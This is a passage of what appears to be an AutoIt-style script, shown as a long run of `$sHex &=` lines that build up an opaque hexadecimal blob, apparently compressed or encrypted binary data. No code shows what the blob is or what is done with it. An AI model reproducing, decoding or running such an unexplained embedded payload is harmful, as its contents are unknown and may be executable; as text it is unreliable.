B5C473D08BD34D9FA0B29554F9084EE5820B0A8A101D9529004E434D929002C4AB441C0CED353F49C1AD946A5B431D690C7E48885029C6A52C2D238947D59482474B091DFB0D63071F450F5FFC2A01817DF3746B6373E3C8C0283023E0480498C13DDBC138B83691E3FB822B8ECE0859296B579A01631A0C7565038798010F240765041151B82A0ADD441608C9700554C787F8748508B15D143B8B52E009CD021E7882948D9ED4ACD06ED187F832FB7E1825FD5632AE87EA557E1442846C9BF701CF1365B88BAA325035D718A62556130BC84986AD1D8C5B83E720D6A8D3E783E752C8C59996C900518344F62D0303854C8E8EA67D2150F7D897BFFB065EA13C6C73C95F3459868543230430C88831188C34528F07D7A365181EF443712834442C84A10C09D2126D916875245E54F738C4932608CF8B835237517079D51BB03104"
    $sHex &= "3CF993E02853D829AC982F209737B9470172785421974CC854E0E0983AC9BB12E64075156972C99B957F66DCDC865B8C23117755F72E579B0944D7B119EE063C0D11CF70F08D48331403FBE3B5C09A573F9547418AF5126D6D14F01AD22E05B650685050C43A10C626892D299F4058D44D85DA46BE63388D6B8D11C3620576C54B0F4556E044405091EB491043DAA5026840B4701A8905E4900A6DC7A4D3667D195CB186414C63931F92800BF7D37C879B74050D34534AC3945C76A39E804CC774817346DED511876B223CF083620C80654B6A92CA915414015430D8B48A0B554F21F656905A4FE3C8303F28DC5A9181D6C9537100B747838164E5422A2214643052719E0A81C883F9CE64BE6B891870856B853628C24608C381457E4277B1E51CF64CFFC30E1C448B9DD36855AD225BE50E52BB2FFBAC29B36B7A5821E7B9851B934B9E75D8D86918495FC70FAF997A4DEA17315459813A7AC09B3D994A394B66E810BF58B33C01E9AB14C58533D2E0C9260E66957DB4D6887457A1AD360C78A39530D03C06B2150B4BB7C9F2A68AB8B6F0B9E430600D2F10E349379DA10907C8853567CC121F83C9D1492562C24F204E755A611326B6318F486781346101BE30E0A45185919522044AA8967F200342984D1A0F04132965620A3F08696BD03A57734A14413961722C8FA3080C05B90C957BC3486F0B076C29925274D2A7242323F2A08A4A034D10200909206969184CC8184B2BE496E648779E000B344557141935C1137257BF8128D70B1E9C6D78FF4CEAB90826183FF5694F28D915BCD4D4F71F3C0288CA86BA260A6A385A25492E240E9B2001E0017805422F6A48AAAE013B6572368C6E7F3587D41181D0801C3ECEE444EA0E6A380313D4DB20126F66BBCFBD0A10D3C4B641231C5C65817A5C50FC61E808754D3508772E06EE22DBC81D40811BA99B083D75E34E6A1307170612978A8620186FC527359918E38B334D672A49425747440389229D330023C6F1B0980B089FD215CD8BC0A6A58D271768F0401B66474B5F11DDBF254BBD83B90C3D15F8D0258C94FE59030C1CA61AEC91A5394CAE4C1D13A2D42A11706654274BC615B05E2F911C22F194C96D9F55C605860C992F3BF00EA91B57A2F4FE614D22265D6B018EB1BB2B0F24866FA49414103702EF81150D188D5E3B44A6B1B259092FF625849D4DCF1CD3B4E2D99276E105D22015212D3EEDA9C118B50125B0022FFD330F42A24DD388797E15CDD294A40AF8C8442C070186C2B863EBE30B6C8D47F3EC8A385888415648C67511FC51A340F005755C500549627CF5288E30A12A01A9CA961640EC342B08AF6F23455F0A892AC340C3A3D8E8110D05311E85C027439547A4C0C05FBA8E024C2800229D0126675DE82FC4E9446001"
    $sHex &= "541D205C9CA553246EF2D0902C65B7170B85D4534127470701B4D20281240697C7B85AC425D53514878BB821F07F01E7B7656A72413C6FF33368C8C129B80AFD0FCA0406696D4FAD3E69A36AE8D2B5093B24847121770501C8BA90318D1FD83D18C887857F19C270401B7764283E635C69B8348D1AE1D58B5593854DD342454A2421DB2D02A6C42317D25B9FB20B9554AA6AAC60105C5115BBA42581A1ADEBAC58EB80C407ACE24003D2DAFF2CF805E3CF6185F8407E1A6A407B0A4B9E8CBCF9C63B566E0B579A18C1C21931A952F89A78F8C894D0396F2F031E774051E828B4302085061A6FAFDD06F40152056497984A35A13192C2C131791C79354800A42F250B14028599095B48351152FB2F7002B70B56A8888BC291657C8F0301A279966F68CC1C4384333F5D1845C0FD068E9F59B4056014C14A320460CD414C7241A2E0E068E34933BE089F2C24CC200DF310EC2D1B96FA861071165A5358F3333691D29A70BFA080D1E854A5742053F43AA7685D695310000753AB41C99310C45AFEEC7D638B55ECFA716C4379A8E07B354A471679D401E19A830CF3531418685C052921C9161E0465ECFA41B169DE5172108989EB8940411B0F530CAFA18C907C05C614E9B40B69A3DCCBC83ED80F9C1E8872AB83F40333814F17C88BC852684918FFC8827012FEB70F8D61047D418E483C438690827146103D5DA0A1C0109E021B2840A21CD558602EC0F8FE9CC08F84571D0272DAADBE8C0D0380DC662C790B34A8AFD167DCEB18D08A4062B175388344BC1198657D301CC0A8C376790AE689D4A441DD4987DC001EF0740E0B57D1281AE1BF136B184FA516189F8003D5BA3ED5E51700D03F06D4BBE57269F0F4F017751970B08004415E836F140443C6BC29C39EA00763741A27F70E0F78062769E13421AEA0D043A23EEC6E9709B71D0F23B68D2310EB97C611BA3320D21402064A21636DA808678BF819181803652B7D63380CDF4F378294B34C0B9AB86AE26064995126060BF4F5526900E930896BE9DC4399FD270957EB308D853855646E05901497F22709ABAE012D1B433AD407312663C323A423972CC0A0A9693C4678930B57977F021F62C44D234DD0235269840F548DDC37E0DC3C8A009C17CBA9087820707C3A4423B9B48B3305C423A36AD4D8B582DD72D417750E0FA1374CA8068516DFF7E0B083DAB525374FB7305C9B2DFCDD45A0DC9D48A76C419AF6C11F0175293EA8507DF7A91D3EB90A74B58F8D7D90F3A54274B725A9BC2381E7B802BB5E08BB8D668D55EE90CA2E098186A98475D800907AC095310B2690C09499462F0A819824DE0FD46F900C0F20741D3DE748C8467B4A1454389ACB00029C33BC30D0509AB720F6A27198B8B5D0C84142FF15CBC88A55BC885128BE0C"
    $sHex &= "247464A827C4DD806A11F70544DC4DA8B87580C011E0BCA93C58D08080E0AB2799D84627B0BE2E887080255379D87120754868F1925195241512AD9289325249C21740238401BFFA8BC2B12B54224318F85B867A8B06AB282564C903DD8EFFED03566D291A615130200506AD132B148503D6045F9DF0444A2085E44D34F474F8C82817A00759231949AD92D63923F8F05D963431A44024FDD008CAA02F8FE8B6347DB0A357FC982475C74293E6AC146253D43B90C2B225DF15B68F96F9087B596310C3181F2298C2737FC44123E35F941085ADDBD6D8CB7F20970CDCB6F615E37F64963C82EBCB10EA4FF934E1D282D5EB595C3C42AEE0285950EB521E14F9115300087445C7A02196D1662017204CC940707F816818B9E4238877017425884AB3C7086A4D6A76360EC2BA966568892A5605E08671FDB4921591BF75305687F0CE3E1DA210856A933857A5DF1032039D379D40C25B19B479D9C0F0D37C13C4B6254C3BD2906E08DEFC025068F3BBD576831E9A3478F6551899D0C402C17F77B18008B463EAB8F0B51018E3A5040CA37B0643A19C267026B710CE0B5C5730F72C225113FAC30F688181076606EF20A269A4E430409A849D7452697FDC080C8D103FE943272E513FB101CB7768515D25890801E14A1D6DA86B9CDF350B853CC22616002B3A8D10C7E0555BABB181EB28587120E02B0D41515232F8A9A78B057CA529EBECC83C3161A7A53104F17C211A987EEAEB6DDB6087E032E496040BA74AA1BBD2E562783F765A3B096AF0BF3B502E1563646940A800261804EBB0755D905E8E04D11524CC7E2C28B062CB04C09C6ABCC61A3F550CFBB51AD0308E656591C0438151E87D3851583D56F981520B656427EB05A566DD195A6B01C15C10D2F7A90C4828EBB71CEB27368C35767B0EA61590298FF4AB5A308EC61F4AD2DAC05401A301B12C5853D7BC6193A549F4693689C32C31D964020EF62A8585C0432C1416E343A1E52C26BE80B3047F2EF7C35897693D76968575F51BE2FE970A284C377F82AC7521DBE369C28232473A1B61B07192F4D91C0BDC502A58CD0225AC811063BA4DD92A5158217035A0B0FACA530C6790F8B59CEDE192260A0C4483118E581A839C7DE8882BE289AE8C330E952212CF335814A6257326105D944C9D91202E8081838982AEB1A4C0115A8C2A74323243417F13137A4D510311BB2A2CD42211F7BA9801ACC1E43599CA04B48F402C68493C451A098D4624C3137161CC26EE20338C5BAE00280B635F028B0D3B35B93F992909423086877187B1BCC814894F9C838DEF94E5047E09D97C16DC77F882C76E43D50C9138E961C7A8D8C244E142FDA0B3529198A0E12AFC034A6C6B2F4907E1E2D22444ADE570CBB9614C0C1F1E8B8532B18851B98BD3DB"
    $sHex &= "EE049E11DF294DB05C6E0C08D4BBAF1EA1B724EC712953F8C9A6DD4858E31AB726ED7AA1076CFC4D437E1B2C08690A48EF53A594262A03068B1069D2C3302011AD311C5668EDEC233DFDB4A410753B4F21C582F15FF423430149415EFFD80E59184DB72DCB632B3B514984ADFC0AD83EAD12915A20755869BC0E157468FF240416DA2FBB48C8CD50968D080A5F341624A78325DD400502518D3599786A29E5462F58AD3D0CDD40345C469E4F5973098541D8A51EDC7A838C75016F75F515924F857BA48B45A45C28A88175514D949408969C01AF1A441A1C76795C7D944369B008654D946E089F6DAB9BF945581F405507C8255C91A8B7875DA922A4B91BE34D0B1F89347C226CCF2471D5E1C58E322C6027D1C52164B840C78B5621121ECAE8713A641CC6773621A153019CE850C5D8E1A990F185D3A0007560F2F49D181942401CA380492B09E961F04AD13214C4187E0E33C0045EC411A7A42C31ED40D6D89FD88DCBA5B9DC9B85E8858D1979429AC18DD28B85501FE362C3019F836A24067221014034A1CD222E4834AB122E09EC5755ACFF30F0B80AABD8DD8ED2B8A082D1B8418F9DD489B4E0B902F3B02B5D6DF58DB92563A187A199139A75D961BC8DED8C029FC001876C3C548361EC84F1D07D21A5A18989B50252D5B12A04C6EBCE5FB9EE00654E516007EFB0E80046482D2FE845A65B040F59F9C9D244B8DDC445EC50B0F1200D3346083960A12C4C30D8B0A3A700D85289C25DC45908EC482E1014B3137190590D1F080132EDDC107B143F30C12770A019BDD9EB3DE32B29BF2DECD2BEED3F2DE7503A100237E00A180845A87541B554269C65D818E9221CFE4FC775E8CC4E01B9D1EF1D011D562CE00335E8C217DE62AD1DC0902C4D500B83C04B47924C1232B3EB4DDAADEC0C22907C186EE8110422104211F8B306B5F4AF056B20115984FD056AE92EABD811E8B8419A2D03C3B0843510A4600DC17B089521588D435CF631F50C618D9AEDF4DB29B3258ADB0B57A8A6E0487A4D78B803D1B758A5805D14473B294CA5E65BBC13DC0CACC02749D88D6DACEF773B2D741C87B00A4FCB1DCFD5107A91C1B6C32CD0901B95AD8199854BEA122697D9E885EC1EF699C6BB0D51E346B75885B40D31C798203DAC03EB3DBBD20A9CE8521503A38AD2033240C645AD36110F81A3FF4FAD8392853B4B5708466C17C926D0241087BEEE577D3228910DDC61030893B99E36DC901F1C2712DA2F832AE8AC304B9634A0BE439077D858A16F26B7966AFA07252C1616D8250802D275C7D0187717961E9A08E9080E10E918BC236ACA1958B170DBD9AF589BA1B42298739B1C12D57700E302DBAD4626E4F2362471141011C632C06F08C41D03A5D772EDC924E4D2751CBE2C013D44DA30CB1B84"
    $sHex &= "0CBC4314DFD08143EB21FDF178CAB780A2F84510560557BDA56D78EB70E54F45B784F1A82703E51B2E52E8C9E503C7A4602E1BF7F407B944712161593DF5A43791499A8F960912D21A715B03412F58D8B1E6DE95409CADD61C139783497D30C9A01389110913FCCFD20825866D0E9420A231849EC50B394190A114FF34A562041580F86E10A0F1889424CE4E552284B756AC30F4122A950CCCD411D412CE4BB8A9F319918054482D79C142B8C255F3086520515B3991B650C059999184E71AACBC11879313F812068946AD1D3BBC59524FC14B801ADB4FC868BE47C15D8AC0B520C0B3A5AD3C87C0742B10C8625161E14BC04DACD2B20F197D0C2784C8BD550F4AD9363C49C51C056F650BDE2775C0954A72C831C4A472B974BDB8BCCC26DC1097B6CEC41774156392C692A7ECCC2E110D7B50771FBD28A461482EAA2B6BCAB4F89C88C43317DC85B3A841CF511B0D906C54F0A43269579054020283795FE05206CE8DFFB463D4A554B435392A988D201420A017290B7725BFA0746F13EFAE77BFC600984860C15025660F04BAF13E8C8D6B53511BA82AEED0C70C890CB16D136D42052F0801574B752235897A3089C384557D796F8F8BA54A015629E5798581550AE586E92D201582BCA02D75065A849717BE75A36045737D84ADB484506F7DBD425D9A9A8ADCECD31EFC61BB406F9DA459678516520A35AF1F65DC61826D751482B8D8460AF955BC019374598AF4CC8C22264605F07F14C2660D682B3726C848AD8793103D2525751B1DCB30477DF8686FC93A2828D9EC5EA47455CF189360251410A41C4B523AF8B4A53581C700B0AF397DDB2E492D816741720C82047504126D5E13AAF4A310ACFF3B890F5DC92856B8577384A185BE7B909364BC0DAC06516F1BF8AC8A421619ACDBC4A503D6233C8F4CD8C12C8A7742800392705F89434983A53C5461654C41A98ACD0F5E86957F5E1518A3F20B4BECB86BC9181183858563DBFBB3EF0470C19DBC29B451F9C501199DB08B45B0D46892A6C4F4C4C1C1A5946394EB9ACA13DB30448EF267C9A48271240F9298A81B0761B3DBA87DA884C3BC2938CAC45145A4C640E1083252D865B01843100D0413A85A09699E0659A8A44B1420785856592B20A18D4145C86D337048026315148821A2C4CDAB5609CD4FC445DB7201A3A4F8199880114A3E988B559863966A4DA7DFFBF47400C264CB0011105AB121FB88C549235FD2D404219BE8CD33418C192E10FC23938C24A714313869FD87207D7D0B236DBF608E2412BD408189D1B35138F595F6611DF371032345A0F06715AD8D3B207DE8D7090A0740AE8D61C3ADD0464A5319165E0A2861B50B408A819F229E298DA1314E03F00027F827E201C08B30A261EC25D816C3AD2D7896EE681667F4"
    $sHex &= "2AA204881E936AF31AD422F56A40F941E842D9319096AAD14DBF9C72E4E2B07717703D1BD05E5CC645E6D941E80488633FD2025108ABA010E410A8FC124232DD3FAD0D3D2C303D91E22B0A0F36E1C4E98518602B9230DC41D0A0C8EC772D6912A8EB1125B0C0FC9474B835E823E23C7A1AA59C32D60019A0274023452083F1C5A13C0A9FF9B844024E088DC343198551A57D086EC56241AB524D29E917B0416F003683D8C52BACE202F835F55907C0D801538CE72C136B1DC963EAEDA489D131570AAB4085EBF83F420019334915C2E52B166AF5024CBC8C03605CC008106B15A44E4ABF8009A984F49C1D5C808A7C09E9961CD0C07C3BC924536DF4D0D0E49B8CC877E4988C521B9CBAB4EEA2271175240A570BE9F4925720D6ABEED0F80AC02368289FF8F00822556FC9AE45233305D63B3E2D2C2CC079F88D6430B1B4B2636422BE8C1E271ADD34F1B60C738DCD482BB83559FC317CEF24C6544AD7E409291D2A0088E1534A5A48ABD3D500EED2C66D90EC86B489EF297432F016F93D1E22CFE3862960FF60B4E30304E71F82124E5900800000E9A680A17FF8193C7A9A94F822794DBFECBC0A16EBB758396E4FA6AC002BED2D3064A42BDD8D40C02AC30B15AE4CE810D5C00DED12A158147F1213A810F55BC432D4A41F1035648C19B9701B442C79F2746A1A23C7D40A42CDC0182A201730841800C2D625E5579B508802B72A3D4DA9C872571C29C6D2172E6B8F974F61729014FC5294827023A4219310D420A6EEBB1AE1168BE0C40DDC506B4DDF22D6819E29CBC01C18046B2DD45B0AC95D0FD024E5103AEA8218C404E8A7F7D02FEA92258DCD4CE0CDC05402CFE066D4C00D6220D1B0F0406B5106C021254FCAD5434BBA415CCF41464D6E3F9DD852351C55230D44DCB2F118D015417A1A83F8335A272E0330D8400287D4761246F5DB03D305E0EBBC89F0048F544B3BF6673AFC2413099DEF68854D201D4433F8CC745BC62BD5D0D3D0A03430CCF38B86A403F8D0D415991AAB0A435F500E3890344F3E37884C2061576E025B60B9E931ADC780610EF80182E0C292F448581A12692F4454580B067DC0028947B1642FE00036962186D7BA8C8D06B0C04343EA2080E1E43471A89489F04F9CAC1A9A521A47438D555B3A865D67B02E968C8F1BB02EE0DB4D991C98C067D708E58C199118893A8826D429165F432489FE7E207A8058CDD3646987A0063F8A57C048D4D5541C8104C66F7C361C206E048AD7F4A185534199745B57A834D0A211A05BDCB0C84202CABB1ADC34F5FFB0CB2E4933D9ABC8956A7539C1EFEF5CC411C470532FC9DECE893BCA3D8EE66173205A548351BFEBE8159BA3D1C048732AE7703FF07410471BCCDFDAD53551A1D78A245E14BAD53471DBBDD09D18A924"
    $sHex &= "18FCE46D4C25812C5F2386447CE9E1D5E55C69108B19E70C139BA9836701B1192C0D56F324798A0764921C1002EBB8FC64484E9EC0BC0C189367C609EB80EB55F45210A96F439DF860E3EDC118C07DB41CB20C4E2F7031160D60BC240AD5B45AE6B64132991B89B10C72785FDF72E169011F129126984A17DCB3C065BC99B8E1C5C1954BD918204926A6C0C9D3E110C0BC73B8046290455724BA00E35BA533F48562C2A162C015E7B75FE29A05E93071BA95006D084D7E268CD6286949D1952E2CE2BED5943E2019472BA3816E38B08415DF1BC0864ADBC3158D782270748D61DF52801581E902FC19785C32F8D0DF3D81609C208407682B5C32D42940A4D409B66ADAB9EF4ACB7808AE0505CAD2A6182B59933166496E6F594821552437CE8074F0ADE39B5B1B69DD8AF80AC5F7240A436A15126B5B5709703B7409C3962603BA40D94EA3165FC62B111B21E4776AB820617E214FFF8206524903EA1836A691D90B093A77498F9BEE137A90427537DD481191D2C2DF6C2AB0532751C80D064EE1A5AA7968EE5923C751FCD027E35B58B389E05FADD209E4FCF4FA40CB2A038B2CA115A983C4DB3B55C4E5F759CD194DCA88B56B487533811D5DD384CB17410804BC185B31908A8C3AC483BFCB934EA1888AC4901C7DA48D6BF908FFF412449A0C5B0526E176F9470167490E5CC400C884896DAD0F4E5AC704A00B49BC7BDD6F98181A71955920BFC41079D9085178FF78FFD0036334117E7CD4830B4DEBD7B99CC4FA1692A3F82AC26287D9408FF27409C0CCDCA326959AA4DC02249CAD42501A5F8D93B13804BFB402701AB811F5707003614D0978370E0891C675C4271B969E9B3B2B8D28D848E3801C332B18CF985071C91B0C0D9DCA34AE31ED716D60ED6B7F087C696B3685307159271EB9401A51C097DCC1C428F890EB2E710F914916E6F2500C1F898AC242446F3E895B05D112121724685D2411FD1C20D647A89BEB191742F09A1F029ECB8D6B83D520C9290358D02B3258E7AFECF0C64CE31939F38BBC6C927E78FF78FF11A5631DD2BFADF0442804E44554F48EA22693F142C79788A9130C0B39886B1E1B22B53D8FDF11DBA370698FD3F47C1DE56F43DD0458A1615260F1464483D96498C6824B4837D1A1830EE69CDC4CB71D28780946DDBDECB2E0F1A161D5D4B1A601C02AF5C0EF87C1872978AD352FAB9C2027740C07904858C4947217712F7505A414233703C82262A4094290C4BB093E00BAE2B314D58E18F4940CDD53D81A3AABB7A984D3808E1ED4464843F1833997C6CCBA7116DD52EC9A60686518B938AC36E47D9B614E5BC8185A2C16891B07148009C011921817D7C40C243EF3113500AA6C3718528411BD45147F26DC742D0D9C2666E38B411A63886322251FC06A"
    $sHex &= "044214AA13DE62577359064E23512788FB980B1B6990C1BDDD8298442EE1EE1CC4D40F6B69F5EC6883C2416B7319242E64E522C11AE3AB3732A7E8A65C46A10BD7D683BB43390F851E7C2B1D75A5E4A0D841CD982A52E006A32005EE0E1BC7A0707B4D1652AA6BA27B10D3B094B0C93BA553CA741D851D6F4E4D895D01951ECBCC0158C8D19318E91816265BA566BA701A8F1211975164DC0BA27E4CCE2B15D014C4541754C58535AC6DBD7F546EEA07ACFB27815A1078B1A6F35E6F419006692A96E84A7CF2692854A5F6F05488244D6CF78A3AA451DAF01E85549316EBD66AA58A5C2D604DE80224A49A1098692784571A26BB900F0241A1121E153100A1349DCAE20ADF304CC7B5EBC42902E8ECC594102E449F448FBACAC60B132318E67A50785FCC6F84217B0FDF7B018CDC320B4B5777287355CBC4AC6126FE5BBA01291B25FF7412BAC920231313D65C02F824DF21B90B453D59136B2D04F0424AE3EB17EB355DA5352DA1EB8BBBB82286C516034A0E4100F9080291016A016B45E052D87F0B1B7105BBBD3F0248814A0CCC50F6A31500BF704644048A691898A7AC6566AE4A5A0B5F579B10C41926E055D6BC8860AB4812DCB228248935473C3880742C6940CC861C534B1AB6C372DC84D9896B31E4F5CF21A63E11B284DFD7E3407E58111DC452438A4052F08CBEA4754333D9C201E131FB8489116350F474247B5D18565E5D5173C87D43EB029CA26004DBEB9BAB188207691DD325185FC2333472092A23436902065BEF985335AE032F7896285FAA7BEDEE167C4E37E51CC08B5D26A419983448D42BA5C1157D082DB52360B80DD5098D148139FBAE15CED4630167F56C28410F430B5209527B0FC5D2177BA8DDD8E702DF4CAD9675B58AEB992E4C9DA77F03256CDD4E9A5B867723FB9803F7039117AA5F1436AC611D5B972FE9910A046B1A963E768CA51B716331602A316C2B2C64E8C4347718865C81706BED32B1122ABDB7D47EDA131E43E895986F2B815239005EEBAD7E98F022308C18A31848F386295D0C4921FC042840971C534754280F47393C5E959E10C8118580A4F091825C1EF264F06B85150431AA6F6A013A08F5C8A540EB510BBF62E2B4748DBFF449AF9820FF81EC86320CC06C2B94CC864957ABA3E40D888C8C8C8CACF8C8A4902A3D8A14FB023B490A4DA693E42B83780A6BB852F890A9D227F0060CC242C62680254A8BB13D5D2751BD2534B04F453B4DB00960C84B43F0703606D285CFF003121B630429AD04F1C10093B0658901BAEA1267B792701723B45869C629046EA269986E1A781844674311B07D0B6381B7857100DEAAB439CD396304A3C111E76122C854D1F4CFD4D0E82D12A8A008B729F290FF08FFBD219602038CEBA3ADB0C6B5283FF97005"
    $sHex &= "5FC13504CECCF53EC5A4DE76E5573F3F31CC1FC2E84F960281E002C601EC5FD4A0C561BB1314A435A4B1B885EB96758F5DF8E30E008F33F811F4E294900E21C72A817BC2DB9CDE1483484440897A3C9EA01471F62E6CE08ACDA71BEC4A27A4C5DD46BCB0274090F4DC02064726661A6FF3C5C092D48882B314B3F0C2BC0D7C691FA3AE43C291310DE1149448029F967904EC33212EDC548A888F5BD66058699F8B66E065B48DEF4C94812495E4F421C5D8B06A7989CAB16FE1013D2F58C0183978C16E7CA466A42566E73054E452B0058A362731105CC69A0C1C37136E2254644395D118AC48C211049172A1C2ABB90C633D117F06002127A40820BEC5A92313F4688DD3AF253E290D002C9A9A4C8C04FF04C50494C2A169EBCA041E5ED83B0F353150E220D88D8D25801FEBD08FAFEB26A0AB6447153CA66EE46A91B01F269EA0914E63B017AD4F3044A2FA7CCDFFDD85578547813E4F082B55CC396EA1D40759742D4B2F5224874A1481E264C700DCC1182D9938184ABC4C656BA08249F7AE8C18DD8F6F983C521A721075A32080149517886B090778D85212C720F139FFD8C744C87555005FB1DA5D0F8DE0B3E4A425A0D56868446453EB68C555391AD46DE8D3B0F994D454EB7C5CD8BB288923CD4AF97AD8894C197836900666D13A2406EE6206FE86F88E09C1D8D72F087C4F6FE05972EBA6ADC53D43815DD22FDF19C9249B44F4E2B414272F3E87690801307D127E859FB29609DFF0508253C7C1326704B0545127DE49C9C2014A00582913B4AD8D8A5B887C1BC2B0E94C293D4D9595A45999245BCEF011A018AC665F6BA8C04F58857D20F7D8A007E01B8CFC404834CC464708ADAD26374140AA83D33F88D5AE06BE0BCFACEB30BDBCD50313D25604AC951A2BC1B0F6678143B434C57A720F80C2A7327529D0194F552D700A405F23821041C2189BA7E181018CBB8C2989C100D112B86736A810E08C8502BB64581989DABFEE5C2A3A9A5B1C6624FF5AC68784C204DB3083F5122B5B93E4A774E290BBEB23AF61210E0DE069C7DBCC41814A7720B9FD5C5E63C38B0B20F42020C38289154F9B58115BE54D0DDDA3A70B3A8D419E837250898D891194C922BFD7686CC335A9D535832C040CA23509A7CB0087862E158D341E07F6473B6F7C2DD4654096FA99531A9501DDD3B071EAC334C2AF5CC32903390AEFFF658DB16C86C9A3371CD72D51112B04023506D0C2BCA12EEC85E4C102EA35FB2FFFDBDE170E2EB4B01D8BB03D98126FD2A755B403B04046B426952B1930E8275EBF01E3989942E61A60D108B361E7548189E9FF7B04526D2045AD5280F1D884423D73A181F0716FF57FE0C2AB07AB17B80788311E1785D14FDBA4033E5D4260F606473BE09BC46086902FC96BC9D20BAC"
    $sHex &= "C0AC68293088C61CC1BDA14FEB910A7540C8C138978CFF7534433786165B5BC6023665BD011C0BEF042906F45ED4F06483983A03470138A2B3AE7D099347D74A749B7510DB18D7367410A2377B362D185B80ECD039EB2E416B8159B836DE4D19807483E92C49BFE915A3E2AEE2EB4339166239D25CBCD2EB214DD01C943628641B021D390A1DC05AD9E391F7C440D553799423C2D28451D0B0A414B39E9A7AF9EC21AB9A5E1D32F4B4BB38C702D4C1D0AD17A4F4AE5616CF01095E59A1AB58D82B1C2F89147015F37C40E65A881DE5213405C10EE8268BD69A951AD823EFAD728CF7E875E122572268D0A3970C1CEB4DE721149E280479ECD1C4B55DDC6B264145EB85A76CED4208B0227EE8025B5E93F02A3C43A3F3F54F236D051189FE1080C2E591129BCD344837840B8FFD12F1155A83EB7C8D255C49B85BBDF84A6599C608E39DC2D6857308AB80512D666362B1D39C562B34F73CB5B776BD9D7C9496A786A8C8CDD4648021766A9327D18947E55103171C7014A395A18302084C9B9AC0C6B46B8C5690E21342902B41524B2C92708002F7178270C002F75AB58017EBB7933AE5314923E2E465F488A5D256B86F8A08BC8BD7857FEB2AC3AAACE31AB46FF17B8DB673688159D1537D9E6716DEC213432C51792A4D06B08484847858E13649494570582106A803701D400620D6D103F034D692DB614803701EC8809CF4F4E2D48D06825CF4D75652D8A9AB4D4A830382715C0EBB0E7F185F8F2CD4130426B43F28D0542801DF0C2C7C74534B0F84ADE530F1151963757DE149036BE0C5D0DD7E9091088A1C8891B948EF777D93D34E807DD869746E0A6AA0774C435D126B087741ECED0E914D59D24C2C8D2FF469020769DC2B185D0DAE8130777EF550EB4C984B95EB2B0EDD0E00B90769B1DF338719823DF82CAC762D4CBE2B08AB2B15C6361918D94996E6BB2DD9F2D8FAAC18C4564DDC6F141D6F0C087A7C0615FCA54C05E20CC121927E69428E663BF0F02DA0C521E175748451450B5E3A05111F9437060D3BC4B67040FF487F52503813B8A18A044E3A18BCF8A127408B8D37745BD2A1A14AEC9B01F4850611FEF5808828B78E861A0643BC1CF089822E7C473B71C057C0564E452C6982C06A6C20670811A43957E88CF4B6230C147B249C2DA99712B8B4006540102D84A50E5BAFB12A47954907ECECD44086D2B6F87E3505579AEDEC6ABCA8EC1B61C317698108021B00B05D308A648881B8391A7768ED99478C49DDD121C15F30594B5E2E160CF24010328602290C001DC9D3376C0CC4A9A7A9C5378C9A2C1CB7E125277B1D8AD29D9C6631499385B0ECC4684D1C165914E5F4780B7F4D820DA488863357B0F483C8160E06AB12591888ECD395AC3E5C2595218605A4CDB8E8652C"
    $sHex &= "A4687BB23E0DDDC3FC24A0C027EA1A8649080174696E17440C0C98E23E34897382B08A175C6E47CA1DB4100DF61642D012F2FD5C512A8433FF0C6F6A7281F45CD4510640F165904A30825F340B277F8C0C750B1452DAF105A14CD5060F0CC35ACD300D0C6D483EDF10187D126A8DA4B16DA785A909E519C7981EB60687010007A721AFF48703087017CD6A6CC6C00100ADEE244E58C78F13DDA006509EAA7D438A08605F43C936824C20EA1B14ECDF8A184300F92F281F093B45187537286004E220CC6C0235B8558DD4368561CDA0DFC602AC189F199384838A85F825200F0020E33481588335003390B912568B0C1CF924F59EA6FD1E03420861423B5742DA450FEC7D436B9A85B30B242A2BF4D9408607C3C58D246C94640D551445B6B0E4506A0E45C2038C5C0C3A6EFF746719CF1DC5F0EC14C40ABB8CF0E1A42A615099CB0F07969860B2FB202F9B7708499E016A2114D646105FADED9B0CAD18F1FF8D03AC13E529585CB0D0E24EB3B046E3417FA96ED55087FE399D32E830B8105AFEBBB104C28541492DF70B9E004DF87F114DCAD113F96A33F122344674F827BF81771A1A7C4945A45CC863E24413ECFC46F22193FC061BA083B94D84A73B98B7E4132731DCD5A88B4DDCF92E259FAC8B45DC80487DA897924E42E0DC441A95B670BA5B8389D01886572FE21E88E827F0AAF05BC692093D017591715867D807202804AE1081B4879F682861DC57A00CA064B4A42AA09711902DDE446BEBB2ACBAED679809E4B3EDAA51E0909A8189ADC44E60853DB51120044F5BB0A4497889D5BD48B4131F4464DC4144E2401EC9B8B8428A893B31105CB86315005CF6632BC10C5C622C5186E452071E44078597B691021B128DA839F46D3D83C5974E4332D77577D7DC5F0926B45E5823A42FDCD6A196A25160719AA6D2F029F85545484DAAFB12461B8B2476832B12716451D6B31913544420038C0DA1094AC1903054A7352FB39542C32AA6415AD1F87F85570744C6B49BDCD05113B35B944657A1878E725E83FC89D031113314A3A286E48EA4F8E53D060A0BB7B00CB0E63E25AE27E7E3A5559413754FC121A237436A8382764CC59C2B747BAB94A6ABB788EBBD92B55E18F990D9871451B8A7A321A2165DA5A73389920086081784C4834FE850A83527B4A4B7A4430CDC809CD8A4C854B5B0890D5CA43BD66672C15A484C63831F2555A598EA3012ED3DF4832E89D8A099B4036930C79ABD49CA222B868D3545AB61848448C2579A94BB0801215D655C32ED505F453932D671BE20A491607920C70CF4D88069F28DC226BF55EC5260434B1ED3FC1800295045BF88D500B00FD41221818710A7C083A0AA3E0A0B62811E1231FD9382BAD16CFFE2C2A79B6E435764FDF0218404B347BCC9CF32"
    $sHex &= "1F850F39181AE2C5027E7229331D1519A52B7C629D026F71851391FFC680B4016899430B27F3F993417DE8B761E71181FB820B80B36B5DD05B746F238D81EC2953E210C69AE0567D55516A9085D5BF712DE101F406211F0F0810575E4C8A5121808850214D508A414941EB0A4C0E76F46BEAEFA49740DCAA43401C63C52D2A55A6F4C982AD265574803B3F34A1D40007D234114A164438D8D4CE59F860A30F3C961E09C2ADE42671E0BD8CC5AE4DB1C999386936B40F11BB0AD0C0A93C112228B46B83CE1E3BADDF92B5168691B7402110BF9D0D110AC4200B3729ED328C01840B05ABA9354D2C0856096B7B43B29765DBD2581C3902A10EE111D8D210370501E525428BBDEEDD505479557CC755B410D0694225CDB5E55C147FD2A055AA5235A50520A80D6CAC58372FD88CD12810AD2010A9B4AFBE6224E971F823061BDC2462C3C85BAD8C09BF28CB1BF1AF2C912CF5308BDC1464F8D8EBDFC308741D3392D862BA009DC01D10F6EBBAA371D0420C0711D30477956456C0E57EE52F114DB2D314140FC1E2ADD0D0D34C8BB61D5B0A8485ED829BD35C058B8725E327643E62DDA910FD0327EC50291057151EA9648302C67EE5D5C5265E44BB6A652DB1507A6E5FAF1D9285736330